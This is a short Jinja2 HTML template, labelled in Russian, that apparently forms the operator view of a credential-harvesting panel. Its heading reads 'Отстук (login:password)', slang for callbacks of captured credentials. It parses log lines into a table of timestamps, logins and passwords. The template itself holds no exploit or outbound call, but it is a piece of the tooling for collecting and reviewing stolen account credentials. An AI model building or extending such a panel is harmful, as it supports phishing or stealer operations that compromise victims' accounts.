{% extends "base.html" %}

{% block content %}
<div class="d-flex justify-content-between align-items-center mb-4">
    <h1 class="h3 text-light fw-semibold">Отстук (login:password)</h1>
</div>

<div class="card bg-dark border-secondary shadow">
    <div class="card-body p-0">
        <table class="table table-hover mb-0 modern-table">
            <thead class="table-dark">
                <tr>
                    <th>Время</th>
                    <th>Логин</th>
                    <th>Пароль</th>
                </tr>
            </thead>
            <tbody>
                {% for log in logs %}
                <tr>
                    <td>{{ log.split(']')[0][1:] }}</td>
                    <td>{{ log.split('Логин: ')[1].split(' | ')[0] }}</td>
                    <td>{{ log.split('Пароль: ')[1] }}</td>
                </tr>
                {% else %}
                <tr>
                    <td colspan="3" class="text-center py-5 text-muted">
                        Пока нет данных
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</div>
{% endblock %}
